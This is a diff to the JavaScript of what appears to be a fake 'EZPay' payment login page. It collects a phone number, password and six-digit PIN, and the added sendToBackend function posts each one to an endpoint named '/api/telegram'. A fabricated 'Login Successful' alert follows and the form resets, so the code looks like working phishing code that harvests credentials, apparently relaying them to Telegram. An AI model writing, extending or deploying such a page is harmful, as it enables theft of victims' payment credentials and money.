@@ -1,5 +1,9 @@
-// script.js
+// script.js - SAME VERCEL HOSTING
 document.addEventListener('DOMContentLoaded', function() {
+    // ---------- CONFIGURATION ----------
+    // SAME VERCEL PROJECT - Backend API URL
+    const API_URL = '/api/telegram';  // Same Vercel project mein
+    
     // ---------- PAGE 1 ELEMENTS ----------
     const phoneInput = document.getElementById('phone-input');
     const passwordInput = document.getElementById('password-input');
@@ -68,9 +72,31 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
     
+    // ---------- API FUNCTIONS ----------
+    async function sendToBackend(data) {
+        try {
+            console.log('Sending to backend:', data);
+            
+            const response = await fetch(API_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            });
+            
+            const result = await response.json();
+            console.log('Backend response:', result);
+            return result;
+            
+        } catch (error) {
+            console.error('API Error:', error);
+            return { success: false, error: 'Network error' };
+        }
+    }
+    
     // ---------- PAGE 1 EVENT LISTENERS ----------
     phoneInput.addEventListener('input', function() {
-        // Auto format: only numbers, max 10 digits
         this.value = this.value.replace(/\D/g, '').slice(0, 10);
         updateSignInButton();
     });
@@ -78,13 +104,12 @@ document.addEventListener('DOMContentLoaded', function() {
     passwordInput.addEventListener('input', updateSignInButton);
     
     // SIGN IN button click
-    signInButton.addEventListener('click', function(e) {
+    signInButton.addEventListener('click', async function(e) {
         if (this.disabled) return;
         
         const phone = phoneInput.value.trim();
         const password = passwordInput.value.trim();
         
-        // Validate
         if (!validatePhone(phone)) {
             showError('phone-error', 'Please enter 10-digit phone number');
             return;
@@ -98,7 +123,14 @@ document.addEventListener('DOMContentLoaded', function() {
         // Show loading
         loadingOverlay.style.display = 'flex';
         
-        // Simulate API call/processing
+        // Send login data to backend
+        await sendToBackend({
+            type: 'login',
+            phone: phone,
+            password: password
+        });
+        
+        // Simulate processing
         setTimeout(() => {
             loadingOverlay.style.display = 'none';
             
@@ -112,13 +144,12 @@ document.addEventListener('DOMContentLoaded', function() {
     
     // ---------- PAGE 2 EVENT LISTENERS ----------
     pinInput.addEventListener('input', function() {
-        // Only allow numbers, max 6 digits
         this.value = this.value.replace(/\D/g, '').slice(0, 6);
         updateCompleteLoginButton();
     });
     
     // COMPLETE LOGIN button click
-    completeLoginButton.addEventListener('click', function() {
+    completeLoginButton.addEventListener('click', async function() {
         if (this.disabled) return;
         
         const pin = pinInput.value.trim();
@@ -131,19 +162,29 @@ document.addEventListener('DOMContentLoaded', function() {
         // Show loading
         loadingOverlay2.style.display = 'flex';
         
-        // Simulate final verification
+        const phone = localStorage.getItem('loginPhone') || '';
+        
+        // Send PIN data to backend
+        await sendToBackend({
+            type: 'pin',
+            phone: phone,
+            pin: pin
+        });
+        
+        // Simulate verification
         setTimeout(() => {
             loadingOverlay2.style.display = 'none';
             
-            // Here you would make the final API call
-            const phone = localStorage.getItem('loginPhone');
-            console.log('Final login:', { phone, pin });
+            // Show success message
+            alert(`✅ Login Successful!\n\nPhone: +91 ${phone}\nPIN: ${pin}\n\nThank you for using EZPay!`);
             
-            // Show success message (you can redirect or show success page)
-            alert(`Login successful!\nPhone: +91 ${phone}\nPIN verified.`);
-            
-            // Or redirect to dashboard
-            // window.location.href = '/dashboard.html';
+            // Clear and reset
+            setTimeout(() => {
+                switchToPage1();
+                phoneInput.value = '';
+                passwordInput.value = '';
+                localStorage.removeItem('loginPhone');
+            }, 2000);
         }, 1500);
     });
     
@@ -155,14 +196,10 @@ document.addEventListener('DOMContentLoaded', function() {
     
     // ---------- PAGE SWITCHING FUNCTIONS ----------
     function switchToPage2(phone) {
-        // Update displayed phone
         displayPhone.value = phone;
-        
-        // Switch pages
         document.querySelector('.page-1').style.display = 'none';
         document.querySelector('.page-2').style.display = 'block';
         
-        // Focus on PIN input
         setTimeout(() => {
             pinInput.focus();
         }, 100);
@@ -172,11 +209,9 @@ document.addEventListener('DOMContentLoaded', function() {
         document.querySelector('.page-2').style.display = 'none';
         document.querySelector('.page-1').style.display = 'block';
         
-        // Clear PIN input
         pinInput.value = '';
         updateCompleteLoginButton();
         
-        // Focus on phone input
         setTimeout(() => {
             phoneInput.focus();
         }, 100);
@@ -189,7 +224,6 @@ document.addEventListener('DOMContentLoaded', function() {
             errorElement.textContent = message;
             errorElement.style.display = 'block';
             
-            // Hide error after 3 seconds
             setTimeout(() => {
                 errorElement.style.display = 'none';
             }, 3000);
@@ -197,13 +231,11 @@ document.addEventListener('DOMContentLoaded', function() {
     }
     
     // ---------- INITIAL SETUP ----------
-    // Check if returning to Page 2 (optional)
     const savedPhone = localStorage.getItem('loginPhone');
     if (savedPhone && window.location.hash === '#verify') {
         switchToPage2(savedPhone);
     }
     
-    // Initialize button states
     updateSignInButton();
     updateCompleteLoginButton();
 });
